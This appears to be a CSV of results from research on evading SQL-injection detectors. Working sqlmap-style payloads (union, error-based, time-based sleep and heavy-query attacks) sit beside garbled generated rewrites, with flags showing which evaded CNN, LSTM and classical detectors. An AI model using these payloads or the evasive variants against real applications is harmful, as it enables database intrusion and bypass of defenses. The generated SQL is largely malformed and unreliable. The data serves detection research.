original_query,generated_query,validity,is_sql_injection,cnn_evaded_detection,lstm_evaded_detection,classical_evaded_detection,ensemble_avg_evaded_detection,ensemble_strict_evaded_detection
"1'))) or 8421=(select count(*) from generate_series(1,5000000)) and ((('bmzj' like 'bmzj","SELECT DISTINCT t1.select count(*) FROM'sql injection detection' AS t1 JOIN query_series(1,5000000) or 8421 ='select count(*)'",0,1,0,0,1,0,0
1' where 3337=3337 and 8403=5760,SELECT MIN(sql injection) FROM SQL SELECT MIN(3337 = 3337 = 3337 AND 8403 = 5760,1,1,0,0,0,0,0
"1' in boolean mode) and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--","SELECT MIN(*) FROM SQL injection detection WHERE NOT domain.domain.columns = ""t1,domain.tables as t3)-- SELECT MIN(select count(*) FROM SQL injection detection)",0,1,0,0,1,0,0
"1'||(select 'xuou' from dual where 7681=7681 or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)))||'",SELECT MIN(select) FROM SQL injection_description WHERE elt(1297 = 7681 = 7681 OR (select = 'xuou'),0,1,0,0,0,0,0
1'+(select iwbs where 4939=4939;begin user_lock.sleep(5); end--,SELECT MIN(select iwbs) FROM SQL injection_detection,1,1,0,1,1,1,0
-8080')) order by 1#,SELECT MIN(sql injection) FROM SQL injection detection ORDER BY MIN(sql injection),1,0,1,1,1,1,1
"1',(select (case when (2073=5314) then 1 else 1/(select 0) end))","SELECT MIN(select) FROM SQL injection detection) FROM SQL SELECT MIN(select) FROM query: 1',(select) FROM query: 1'",0,1,0,0,1,0,0
"1')) and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (('novq'='novq",SELECT MIN(((((((((((((((((((((((((((((((((((())) FROM SQL injection)) FROM SQL injection),1,1,0,0,0,0,0
"1) union all select null,null,null,null#","SELECT MIN(null),null,null,null# FROM SQL SELECT MIN(null) FROM SQL SELECT MIN(null) FROM SQL SELECT MIN(null) FROM SQL SELECT MIN(null) FROM SQL",1,1,1,0,1,1,0
"1') as bfgl where 8959=8959 union all select null,null,null,null,null,null,null,null,null,null--",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL SELECT MIN(sql) FROM SELECT MIN(sql) FROM SQL,1,0,1,1,1,1,1
"1"")) and 8329=5584#",SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
"1;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5-- mkoo",SELECT COUNT(*) FROM SQL injection detection WHERE NOT all_users IN (SELECT all_users FROM SQL injection detection),1,1,1,1,1,1,1
"1'));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and (('gfln'='gfln","SELECT COUNT(*) FROM sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ((gfln'= 'gfln')) FROM SQL injection detection')",1,1,0,0,0,0,0
"-5245""))) union all select 8106,8106,8106#","SELECT MIN(8106,8106,8106#) FROM SQL injection_description",1,1,1,1,1,1,1
"-5606)) or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#","SELECT MIN(select) FROM SQL injection detection WHERE NOT ix7171706a71 = ""SQL"" ORDER BY ix7171706a71,(select)",0,1,0,0,1,0,0
"1') as jwch where 4609=4609;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",SELECT SUM(*) FROM SQL injection detection WHERE 4609 = 4609 = 4609;select count(*) FROM SQL-injection,1,1,0,0,1,0,0
"1 or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)# zcyc","SELECT COUNT(*) FROM SQL_Injection WHERE NOT sysusers as sys1,sysusers as sysusers as sys4,sysusers as sys4,sysusers as sys7# zcyc""",1,1,0,0,0,0,0
"-1917"") or 8571=8571--",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM Query: -1917 OR 8571 = 8571 = 8571 - - SELECT MIN(sql injection) FROM SQL injection,1,1,0,0,0,0,0
"-6815 where 7609=7609 or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#","SELECT MIN(select) FROM SQL injection_engineer WHERE 7609 = 7609 = 7609 OR 1 group = ""concat(0x7171706a71,(select)""",0,1,0,0,0,0,0
1) where 4992=4992;select case when 7717=7717 then 1 else null end--,SELECT MIN(select) FROM SQL injection detection WHERE 4992 = 4992 = 4992 = 4992;select case when 7717 = 7717 AND NOT 7717 = 7717 = 7717 ORDER BY COUNT(*) DESC LIMIT 1,0,1,0,0,0,0,0
"1'||(select 'gmkp' where 6016=6016;select count(*) from generate_series(1,5000000))||'",SELECT MIN(*) FROM SQL injection detection,1,0,1,1,1,1,1
"1' where 5801=5801 or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x)--","SELECT MIN(select) FROM SQL injection_deficite) FROM SQL_Inject JOIN (SELECT SUM(select) FROM SQL JOIN (SELECT SUM(select) FROM SQL JOIN (SELECT SUM(select) FROM SQL JOIN (SELECT SUM(select) FROM SQL JOIN (SELECT SUM(select) FROM SQL JOIN (SELECT SUM(select) FROM 5801 = 5801 = 5801 = 5801 = 5801 ORDER BY select DESC,'sql injection')",0,1,0,0,1,0,0
"-9736' or make_set(7311=2067,2067) and 'czdt' like 'czdt",SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
1) as jmib where 8130=8130 rlike (select (case when (7885=3932) then 1 else 0x28 end))--,"SELECT MIN(case) FROM SQL injection detection WHERE NOT jmib = 8130 = 8130 rlike (select (case) FROM jmib WHERE 7885 = 3932) AND NOT 0x28 end) = ""sql injection""",0,1,0,0,0,0,0
1) rlike (select * from (select(sleep(5)))sgvo),SELECT MIN(select(sleep(5))sgvo) FROM SQL injection_description,1,1,0,0,1,0,0
"-3587') or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ('psqt' like 'psqt",SELECT DISTINCT'seq' FROM SQL injection',1,0,1,1,1,1,1
"1')) or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (('aovy'='aovy",SELECT'sql injection' FROM table_repeat(repeat(left(crypt_key) or bychar(69)||char(100) = 'aovy',1,1,0,0,1,0,0
"1')) and elt(4460=2665,2665) and (('qmzu'='qmzu","SELECT DISTINCT elt(4460 = 21665,2665) FROM SQL injection_description WHERE NOT qmzu = 'elt(4460 = 21646)' AND'sqmzu' ='sqmzu'",1,1,0,0,0,0,0
"1'+(select 'yjpp' where 8966=8966;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)+'",SELECT MIN(*) FROM SQL injection detection,1,0,1,1,1,1,1
"-6122"") union all select 6578,6578--","SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT 6578,6578-- FROM SQL_Injection",1,1,1,1,1,1,1
"-9003"")) union all select 9721,9721--","SELECT 9721,9721-- FROM SQL injection_description WHERE NOT -9003 ='sql injection'",1,1,1,1,0,1,0
"1%"")) union all select null,null,null,null,null,null#","SELECT MIN(sql injection) FROM SQL - SELECT null,null,null FROM SQL - SELECT null,null,null FROM SQL - SELECT null,null,null FROM SQL - SELECT null,null,null FROM SQL - SELECT null,null,null FROM SQL - SELECT null,null,null FROM SELECT SUM(sq_injection) FROM SQL SELECT SUM(swich) FROM SELECT SUM(swift_null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null FROM SQL SELECT MIN(sql) FROM SQL SELECT SUM",1,0,1,0,0,0,0
"1') or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and ('iifh'='iifh",SELECT MIN(select) FROM SQL injection_detection,0,0,0,1,1,1,0
1'))) waitfor delay '0:0:5' and ((('zhhf' like 'zhhf,SELECT 'zhhf' FROM SQL injection',1,0,1,1,1,1,1
"1""))) union all select null,null,null,null,null,null,null,null--","SELECT null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null, null, null, null, null, null, null, null,null-- if FROM SQL injection))",1,1,0,0,0,0,0
1');select sleep(5) and ('qcsv'='qcsv,SELECT DISTINCT'sqcsv' FROM SQL injection_detection,1,0,1,1,1,1,1
"-2417) union all select 2169,2169,2169,2169,2169,2169,2169,2169,2169,2169#","SELECT MIN(sql injection) FROM SQL_injection WHERE NOT SELECT MIN(sql injection) = '2169,2169,2169,2169,2169,2169,2169,2169#'",1,1,0,0,0,0,0
1;begin dbms_lock.sleep(5); end--,"SELECT NOT end-- type FROM query: 1;begin dbms_lock.sleep(5); end-- SELECT FROM query: 1;begin dbms_lock.sleep(5); end-- SELECT generated FROM SQL query: 1;begin dbms_lock.sleep(5); end-- SELECT generated FROM query: 1;begin dbms_lock.sleep(5);""SQL - SELECT FROM SELECT SUM(invalid) FROM SELECT dbms_lock.sleep(5); end-- end-- sleep(5); query: 1;begin dbms_lock.sleep(5); query: 1;begin dbms_lock.sleep(5); end-- SELECT MIN(end--) FROM SQL SELECT query: 1;begin dbms_lock.sleep(5); end-- SELECT MIN",1,1,0,0,1,0,0
"1') or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ('iwkg'='iwkg","SELECT * FROM SQL_injection, 'evade SQL injection' FROM * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * FROM * * * * * * * * * * * * * * * * * * FROM SQL_injection",1,1,1,1,1,1,1
"1') and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and ('jvll' like 'jvll","SELECT t2.select, t2.select(select) FROM (SELECT t2.select, t2.select FROM (SELECT t2.select, MIN(select) FROM Query: 1') AS t1 JOIN SQL injection detection AS t2 ON t1.select = t2.select WHERE t2.select (select) ='sql injection') and (jvll) ='sql injection') - SELECT t2.select(select(select(select(select) FROM SELECT t2.select,'select_xx_xx_xx') FROM (SELECT t2.select,'select_select,'sql injection') FROM (SELECT t2.select,'select_select_value,'sql injection') FROM t2.select - se",0,1,0,0,1,0,0
1%'))) and 2444=9282#,SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM query: 1%'),1,1,0,0,1,0,0
1') as irnj where 7274=7274 and 6969=(select 6969 from pg_sleep(5))--,"SELECT 6969 FROM pg_sleep(5)) AS _executive FROM SQL injection_detection WHERE ""SQL"" = 7274 = 7274 AND 6969 = (select 6969 = 6969 = ""select 6969""",1,1,0,0,0,0,0
"-8124) union all select 7251,7251,7251#","SELECT MIN(SQL) FROM SELECT 7251,7251,7251# FROM SQL SELECT MIN(SQL) FROM Query: -8124) union = 7251,7251,7251#",1,1,0,0,0,0,0
-4669) or 2452=1601#,SELECT * FROM query: -4669) ORDER BY query_generated LIMIT 1,1,1,1,1,1,1,1
"1"") or 8156=(select count(*) from generate_series(1,5000000))--","SELECT MIN(*) FROM query_series(1,5000000)-- SELECT MIN(select count(*) FROM query_series(1,5000000) FROM SQL injection detection",1,1,0,0,1,0,0
"1%')) union all select null,null,null--","SELECT null,null,null-- FROM SQL injection_detection WHERE NOT null,null-- done = ""execut""",1,1,1,0,0,0,0
-1602' or 3038=3038,SELECT MIN(3038 = 3038) FROM SQL injection,1,1,0,0,1,0,0
-9841 where 4612=4612 union all select 4612--,SELECT MIN(4612 = 4612-- for) FROM SQL injection,1,1,0,0,1,0,0
"1'||(select 'rfjl' where 2476=2476 or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4))||'","SELECT MIN(select) FROM SQL injection > ""2476 = 2476 = 2476 or 7552 =(select) FROM rdb$collations as t3,rdb$functions as t3)||'""",0,1,0,0,0,0,0
"1%');select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--","SELECT COUNT(*) FROM rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",1,1,0,0,0,0,0
"1')) as lizu where 7691=7691 or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",SELECT MIN(repeat(left(crypt_key)||char(69) FROM SQL injection) AS :_null_injection) FROM SELECT MIN(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(761) = 7691 = 7691 = 7691 = 7691) AND NOT char(69) ='sql injection',1,1,0,0,1,0,0
"-3546%"" or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and ""%""=""",SELECT MIN(select case) FROM SQL injection detection WHERE 5903 = '1 else 0 end from rdb$database)||'qzvzq',0,1,0,0,1,0,0
1' in boolean mode) and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)#,"SELECT * FROM SQL injection_deficite', COUNT(*) FROM SQL_injection_deficite) FROM SQL_injection_poster WHERE NOT chr(112)||chr(113)||chr(113)||chr(113)||chr(113)",1,1,0,0,1,0,0
-9358' or 9887=2569--,SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM query: -9358' OR 9887 = 2569--,1,1,0,0,1,0,0
"1'||(select 'fdkl' where 4572=4572 union all select null,null,null,null,null,null,null,null,null#",SELECT 'fdkl' FROM SQL - SELECT MIN(select) FROM SQL - SELECT MIN(select) FROM SQL - SELECT 'fdkl' FROM SQL - SELECT MIN(select) FROM SQL - SELECT MIN(select) FROM SQL - SELECT MIN(select) FROM SELECT 'fdkl' FROM SQL SELECT MIN(select 'fdkl' FROM SQL SELECT MIN(select) FROM SQL SELECT MIN(select) FROM SELECT SUM(select) FROM SELECT SUM(select) FROM SQL SELECT MIN(select) FROM SELECT MIN(select) FROM SQL SELECT MIN(select) FROM SELECT SELECT 'fdkl' FROM SQL SELECT MIN(select) FROM SQL SELECT MIN(select) FROM SELECT MIN(select) FROM SQL ,0,0,0,0,1,0,0
1) where 9167=9167;select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#,SELECT 6276 FROM SQL_injection_details AS T1 JOIN 966 = T2.select WHERE T1.case = 6276 = 6276 ORDER BY COUNT(select) DESC LIMIT 1,0,1,0,0,0,0,0
"1"")));select pg_sleep(5)--",SELECT pg_sleep(5)-- FROM SQL injections EXCEPT SELECT pg_sleep(5)-- FROM SQL_injection,1,1,0,0,1,0,0
"1%"")) union all select null--",SELECT DISTINCT null-- FROM SQL injection detection,1,1,1,1,1,1,1
"1' in boolean mode) union all select null,null,null,null,null,null,null#",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL,1,0,1,1,1,1,1
-2456'))) or (8459=8459)*4906 and ((('bbkp'='bbkp,SELECT * FROM SQL injection_detect_required FROM SQL SELECT * FROM Query: -2456') ORDER BY *4906,1,1,1,1,1,1,1
"-4155'))) union all select 1775,1775,1775,1775,1775,1775,1775--",SELECT MIN(SQL) FROM SQL SELECT MIN(SQL) FROM query: -4155')),1,1,0,0,1,0,0
"1' in boolean mode) union all select null,null,null,null,null,null,null,null,null,null--",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL,1,0,1,1,1,1,1
"1"") or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (""oxxi""=""oxxi",SELECT SUM(*) FROM SQL injection detection WHERE NOT all_users = 1,1,1,0,0,1,0,0
"1"" where 5328=5328 and 2388=benchmark(5000000,md5(0x6d457153))#","SELECT MIN(5000000,md5(0x6d457153) FROM SQL injections WHERE NOT md5(0x6d457153) = '5328=5328' AND 2388 = benchmark(5000000,md5(0x6d457153)#'",1,1,0,0,1,0,0
"1')));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ((('qhgp'='qhgp",SELECT * FROM rdb$fields WHERE NOT rdb$types ='sqhgp' AND NOT rdb$collations = 't4' ORDER BY qhgp,1,0,0,0,1,0,0
1')));select case when 7717=7717 then 1 else null end--,SELECT MIN(sql injection) FROM SQL injection detection WHERE 7717 = 7717 = 7717 AND NOT 7717 = 7717 AND NOT 77LL end-- end--,1,1,0,0,0,0,0
"1) and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and (5220=5220","SELECT MIN(select) FROM SQL injection_deficite) FROM SQL_injection WHERE NOT elt(6237,7469) = '7' AND floor(rand(0)*2) ='sql injection'",0,1,0,0,1,0,0
"1%'))) and make_set(1543=5817,5817) and ((('%'='",SELECT MIN(((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((())) FROM SQL SELECT SELECT SUM(((((((((((((((((((((((((((((((((((((((((((((((((((((((((())))))))))))))))))))))))))))))))))))))))))))) FROM SQL injection)))))))))))))))))))))))),1,1,0,0,0,0,0
"1'||(select 'osux' from dual where 7066=7066 or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3))||'",SELECT MIN(select) FROM SQL injection detection WHERE'sq injection' ='sq injection',0,0,0,0,1,0,0
"1));select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--","SELECT * FROM query_series WHERE NOT4592 ='sql injection detection' AND NOT case = ""sql injection detection""",0,1,1,1,1,1,1
-2951 or 4189=2291,SELECT * FROM query: -2951 or 4189 = 2291,1,1,0,1,1,1,0
-2912')) order by 1--,SELECT MIN(1 AS __gable__) FROM SQL injection_description WHERE NOT SELECT MIN(sql injection) FROM query: -2912') ORDER BY - SELECT MIN(sql injection) FROM SQL injection,0,1,0,0,1,0,0
"1"")) as ycvh where 4523=4523 and sleep(5)#",SELECT MIN(4523 = 4523 AND sleep(5)#) FROM SQL injection detection,0,1,0,0,1,0,0
"-9606%""))) union all select 8572,8572,8572,8572,8572,8572,8572,8572,8572--","SELECT MIN(8572,8572,8572,8572,8572,8572,8572,8572,8572-- FROM SQL SELECT MIN(SQL injection) FROM SELECT MIN(SQL) FROM SELECT 8572,8572,8572,8572,8572,8572,8572,8572,8572,8572,8572,8572,8572,8572,8572,8572,8572,8572,8572,8572,8572,8572,8572,8572,8572,8572,8572,8572,8572,8572,8572,8572,8572,8572,8572,8572,8572,8572,8572,8572,8572,8572,8572,8572,8572,8572,8572,8572,8572,8572,8572,8572,8572,8572,8572,8572,8572,8572,8572,8572,8572,8572,8572,8572,8572",1,1,1,0,0,0,0
"1' and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and 'kird'='kird",SELECT MIN(select) FROM SQL injection_detection,0,0,0,1,1,1,0
"1'||(select 'bpml' where 7360=7360 or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)))||'","SELECT MIN(select) FROM SQL injection_deficite, COUNT(select) FROM SQL_INSERT SELECT MIN(select) FROM SQL_INSERT_0 WHERE 7360 = 7360 ORDER BY elt(1297 = 1297)",0,1,0,0,1,0,0
"1 and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161)# dyed","SELECT * FROM SQL injection_detect WHERE NOT elt(3393 = 3393,0x71706a71), NOT elt(3393 = 3393,1)",1,1,1,0,1,1,0
-1876%') union all select 6463--,SELECT MIN(sql injection) FROM SQL SELECT 6463-- FROM SQL SELECT MIN(sql injection) FROM SQL Query: -1876%'),1,1,0,0,1,0,0
"1%"") and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and (""%""=""","SELECT MIN(repeat(right(9981),5000000000) FROM SQL injection_repeat(repeat(right(9981),000000000), null) FROM evade SQL injection detection",1,1,0,0,1,0,0
1') and 6969=(select 6969 from pg_sleep(5)) and ('ayol'='ayol,SELECT 6969 FROM pg_sleep(5) and (SELECT 6969 = 'ayol') FROM SQL injection detection',1,1,0,0,1,0,0
"1%')) union all select null,null,null,null,null,null#",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL,1,1,1,1,1,1,1
"-6587') union all select 6349,6349,6349,6349,6349,6349,6349,6349,6349,6349--","SELECT MIN(suel injection) FROM SQL_Injection WHERE NOT 6349,6349,6349,6349,6349,6349,6349,6349,6349,6349-- for = ""SQL injection detection""",1,1,1,1,0,1,0
"1')) as sojl where 8710=8710 or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--","SELECT MIN(repeat(right(right) -- null) FROM ssl injection_diagnosis, SELECT 8710 FROM 8710 = 8710 OR char(119)||char(121) FROMregexp_substring(repeat(right(right(right) --) FROM ssl) AS _executive_()) FROM SELECT MIN(repeat(repeat(repeat(right(right(right(right(right(right(right)|char(5000000000) FROM SELECT MIN(repeat(repeat(right(right(right(right(right(right(right(right(99)|char(121) FROM SELECT MIN(repeat(repeat(right(right(right(right(right(right(right(right(right(right(right(right(right(right(right) FROM SQL injection) FROM SELECT MIN(repeat(repeat(right(right(right(right(right) FROM SELECT MIN(",1,1,0,0,1,0,0
